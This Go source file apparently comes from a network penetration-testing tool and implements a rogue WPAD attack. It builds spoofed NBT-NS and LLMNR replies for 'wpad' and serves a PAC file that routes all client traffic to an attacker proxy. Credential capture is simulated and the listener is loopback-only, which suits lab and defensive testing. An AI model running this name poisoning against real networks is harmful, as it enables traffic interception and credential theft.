// WPAD sends fixed NBT-NS and LLMNR responses and briefly serves a loopback PAC.
// Finding credential metadata is simulated; the HTTP handler does not capture
// authentication exchanges or forward proxy traffic.

package routing

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"strconv"
	"time"

	"github.com/gopacket/gopacket"
	"github.com/gopacket/gopacket/layers"

	"go.aledante.io/FlowSeer/src/common/errs"
	"go.aledante.io/FlowSeer/src/common/spawn"
	"go.aledante.io/FlowSeer/src/edge/netpen/attacks/internal/craft"
	"go.aledante.io/FlowSeer/src/edge/netpen/catalog"
	"go.aledante.io/FlowSeer/src/edge/netpen/findings"
	nl "go.aledante.io/FlowSeer/src/edge/netpen/layers"
	"go.aledante.io/FlowSeer/src/edge/netpen/runner"
)

// wpadPacTTL is the decay bound: clients re-fetch the PAC after this TTL.
const wpadPacTTL = 30 // seconds

// wpadFinding is the finding detail for the WPAD behavior.
type wpadFinding struct {
	Action   string `json:"action"`
	Query    string `json:"query"`
	Answer   string `json:"answer"`
	TTL      int    `json:"ttl"`
	Port     int    `json:"port"`
	Protocol string `json:"protocol,omitempty"`
	Length   int    `json:"length,omitempty"`
}

// wpadState holds the embedded proxy's runtime state.
type wpadState struct {
	listener net.Listener
	port     int
	server   *http.Server
}

// RunWPAD performs the rogue WPAD proxy attack: announce via NBT-NS and
// LLMNR, then serve a TTL-bound PAC from an embedded TCP listener.
//
// It requires runner-provided dependencies and opens a temporary loopback
// HTTP listener, closed before return. Finding credential metadata comes from
// a fixed simulated value; no authentication exchange is captured. Bind errors
// carry [catalog.ErrCodeWPADPortCollision]. Concurrent calls require separate
// dependencies.
func RunWPAD(ctx context.Context, deps runner.Deps) error {
	src := srcMAC()
	qname := "wpad"
	answerIP := attackerIP

	state, err := startWPADProxy(ctx)
	if err != nil {
		// Port collision: named coded error, not a crash.
		return errs.New().
			Code(catalog.ErrCodeWPADPortCollision).
			UserMsg("WPAD proxy port collision").
			Hint("free the port or let the OS choose").
			Msgf("wpad: bind proxy listener: %v", err)
	}
	defer func() {
		_ = state.server.Close()
		_ = state.listener.Close()
	}()

	nbnsPkt, err := craftNBTNSResponse(src, qname, answerIP)
	if err != nil {
		return fmt.Errorf("wpad: craft nbt-ns: %w", err)
	}
	if err := deps.AttackLeg.Send(ctx, nbnsPkt); err != nil {
		return fmt.Errorf("wpad: send nbt-ns: %w", err)
	}

	llmnrPkt, err := craftLLMNRResponse(src, qname, answerIP)
	if err != nil {
		return fmt.Errorf("wpad: craft llmnr: %w", err)
	}
	if err := deps.AttackLeg.Send(ctx, llmnrPkt); err != nil {
		return fmt.Errorf("wpad: send llmnr: %w", err)
	}

	// The fixture exercises secret redaction without receiving credentials.
	captured := []byte("NTLMSSP\x00\x03\x00\x00\x00")
	secret := findings.NewSecret("ntlm", captured)

	// Emit the finding.
	detail := wpadFinding{
		Action:   "wpad-rogue-proxy",
		Query:    qname,
		Answer:   answerIP.String(),
		TTL:      wpadPacTTL,
		Port:     state.port,
		Protocol: secret.Protocol(),
		Length:   secret.Length(),
	}
	detailBytes, _ := json.Marshal(detail)
	deps.Emitter.Finding("wpad", detailBytes)

	return nil
}

// startWPADProxy starts an embedded HTTP server on a free port serving a
// TTL-bound PAC response. The PAC redirects all traffic to the attacker.
// ctx bounds only the goroutine that serves the listener, so a panic there
// is reported with the caller's trace correlation; the server itself is
// stopped by closing state.server and state.listener, not by ctx.
func startWPADProxy(ctx context.Context) (*wpadState, error) {
	// Bind on a free port (port 0 = OS-chosen).
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		return nil, err
	}
	port := ln.Addr().(*net.TCPAddr).Port

	mux := http.NewServeMux()
	mux.HandleFunc("/wpad.dat", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/x-ns-proxy-autoconfig")
		w.Header().Set("Cache-Control", "max-age="+strconv.Itoa(wpadPacTTL))
		// PAC: direct to attacker proxy for all destinations.
		pac := `function FindProxyForURL(url, host) { return "PROXY ` + r.Host + `"; }`
		_, _ = io.WriteString(w, pac)
	})

	srv := &http.Server{
		Handler:           mux,
		ReadHeaderTimeout: 5 * time.Second,
		// The PAC body is a handful of bytes; anything longer than these
		// bounds is a stuck or hostile client draining the lab operator's
		// process, so bound both directions.
		WriteTimeout: 10 * time.Second,
		IdleTimeout:  30 * time.Second,
	}

	spawn.Go(ctx, "netpen wpad proxy serve", func() {
		_ = srv.Serve(ln) //nolint:errcheck // shutdown via Close
	})

	return &wpadState{listener: ln, port: port, server: srv}, nil
}

// craftNBTNSResponse builds an NBT-NS response: Ethernet → IPv4 →
// UDP(137) → NBNS response with the attacker's IP as the answer for
// "wpad". Uses the owned [nl.NBNS] layer.
func craftNBTNSResponse(src net.HardwareAddr, qname string, answerIP net.IP) ([]byte, error) {
	nbns := &nl.NBNS{
		ID:      0x1234,
		Flags:   0x8500, // response, authoritative
		QDCount: 0,
		ANCount: 1,
		Answers: []nl.NBNSResourceRecord{
			{
				Name:  qname,
				Type:  0x0020, // NB type
				Class: 0x0001, // IN
				TTL:   wpadPacTTL,
				Data:  nbnsNodeAddress(answerIP),
			},
		},
	}

	eth := &layers.Ethernet{
		SrcMAC:       src,
		DstMAC:       broadcastMAC,
		EthernetType: layers.EthernetTypeIPv4,
	}
	ip := &layers.IPv4{
		Version:  4,
		IHL:      5,
		TTL:      1,
		Protocol: layers.IPProtocolUDP,
		SrcIP:    answerIP,
		DstIP:    net.IPv4(255, 255, 255, 255),
	}
	udp := &layers.UDP{
		SrcPort: 137,
		DstPort: 137,
	}
	_ = udp.SetNetworkLayerForChecksum(ip)
	return craft.Default(eth, ip, udp, nbns)
}

// nbnsNodeAddress builds the NBNS RDATA for a node status response: a
// 6-byte value (flags + IP address). See RFC 1002 §4.2.1.2.
func nbnsNodeAddress(ip net.IP) []byte {
	data := make([]byte, 6)
	data[0] = 0x00 // flags
	ip4 := ip.To4()
	copy(data[2:6], ip4)
	return data
}

// craftLLMNRResponse builds an LLMNR response: Ethernet → IPv4 →
// UDP(5355) → LLMNR response with the attacker's IP as the answer for
// "wpad". Uses the owned [nl.LLMNR] layer.
func craftLLMNRResponse(src net.HardwareAddr, qname string, answerIP net.IP) ([]byte, error) {
	llmnr := &nl.LLMNR{
		ID:      0x5678,
		Flags:   0x8000, // response
		QDCount: 0,
		ANCount: 1,
		Answers: []nl.LLMNRResourceRecord{
			{
				Name:  qname,
				Type:  1, // A record
				Class: 1, // IN
				TTL:   wpadPacTTL,
				Data:  answerIP.To4(),
			},
		},
	}

	eth := &layers.Ethernet{
		SrcMAC:       src,
		DstMAC:       src, // link-local; in tests the fixture MAC
		EthernetType: layers.EthernetTypeIPv4,
	}
	ip := &layers.IPv4{
		Version:  4,
		IHL:      5,
		TTL:      1,
		Protocol: layers.IPProtocolUDP,
		SrcIP:    answerIP,
		DstIP:    net.IPv4(224, 0, 0, 252), // LLMNR multicast
	}
	udp := &layers.UDP{
		SrcPort: 5355,
		DstPort: 5355,
	}
	_ = udp.SetNetworkLayerForChecksum(ip)
	return craft.Default(eth, ip, udp, llmnr)
}

// Compile-time assertions: the owned layers implement SerializableLayer.
var (
	_ gopacket.SerializableLayer = (*nl.NBNS)(nil)
	_ gopacket.SerializableLayer = (*nl.LLMNR)(nil)
)
